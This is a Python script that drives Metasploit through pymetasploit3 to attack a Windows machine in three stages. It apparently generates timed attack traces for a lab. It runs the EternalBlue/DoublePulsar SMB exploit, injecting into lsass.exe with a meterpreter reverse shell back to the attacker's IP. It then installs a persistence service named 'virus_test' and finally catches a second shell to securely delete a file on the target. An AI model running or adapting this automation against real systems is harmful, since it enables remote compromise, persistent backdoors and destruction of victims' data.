# -*- coding: utf-8 -*-
"""
Created on Fri Aug  6 16:56:45 2021

@author: jackson
"""

import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
   
    """
    First Stage
    """
    print("Start eternalblue_doublepulsar")

    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')


    exploit = client.modules.use('exploit', 'windows/smb/eternalblue_doublepulsar')
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    
    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 445
    exploit['PROCESSINJECT'] = 'lsass.exe'
    payload['LHOST'] = my_ip
    payload['LPORT'] = 4444
   
    output_time_file = 'time_start.txt'
    record_timestamp(folder, output_time_file)

    time.sleep(2)
    #print('Start 1')

    exploit.execute(payload=payload)
    time.sleep(2)

    while client.jobs.list:
        time.sleep(1)

    time.sleep(10)
    print('1st stage end')
    print(client.sessions.list) 

    # print(client.sessions.list['1'])

    

    #print('Finish 1')
    # print(client.sessions.list['2'])

    """
    Second Stage
    """

    exploit = client.modules.use('exploit', 'windows/local/persistence_service')
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')

    exploit['SESSION'] = 1
    exploit['REMOTE_EXE_NAME'] = 'virus_test'
    exploit['SERVICE_NAME'] = 'virus_test'
    payload['LPORT'] = 1234
    payload['LHOST'] = my_ip

    exploit.execute(payload=payload)

    time.sleep(2)

    while client.jobs.list:
        time.sleep(1)

    time.sleep(10)
    print("before")
    print(client.sessions.list) 

    client.sessions.session('1').stop()
    client.sessions.session('2').stop()

    print('2nd stage end')
    print(client.sessions.list) 

    """
    Third Stage
    """


    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')

    payload['LHOST'] = my_ip
    payload['LPORT'] = 1234

    exploit.execute(payload=payload)

    while client.jobs.list:
         time.sleep(1)

    time.sleep(10)
    print(client.sessions.list)     
    shell = client.sessions.session('3')
    shell.write('run post/windows/manage/sdel FILE=C:/Users/Public/Kalimba.mp3')
    time.sleep(20)
    print(shell.read())
 
    client.sessions.session('3').stop()

    print('3rd stage end')

    time.sleep(2)
    output_time_file = "time_end.txt"
    record_timestamp(folder, output_time_file)
    time.sleep(2)


main(sys.argv)

